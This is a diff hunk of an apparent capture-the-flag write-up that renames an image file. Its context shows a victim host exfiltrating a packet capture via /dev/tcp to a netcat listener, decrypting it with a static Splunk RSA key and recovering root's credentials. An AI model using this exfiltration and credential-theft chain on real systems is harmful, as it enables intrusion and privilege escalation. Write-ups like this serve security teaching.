@@ -54,7 +54,7 @@ The password used to encrypt the above RSA key is static across splunk instances
 Back on the box I let `tcpdump` run for a short while and sent the output to `output.pcap`. I can copy this file to the host by running `nc -nvlp 7777 >
 output.pcap` on my box and `cat output.pcap > /dev/tcp/172.18.0.1/7777` on the victim.
 
-<img src="images/root_creds.png">
+<img src="images/rootcreds.png">
 
 Now I'll use `tshark` to try and decrypt the traffic using the plaintext RSA private key. 'Grepping' for known headers, we can spot the basic authorization header which reveals root's credentials. Run `su -` and its job done.
 
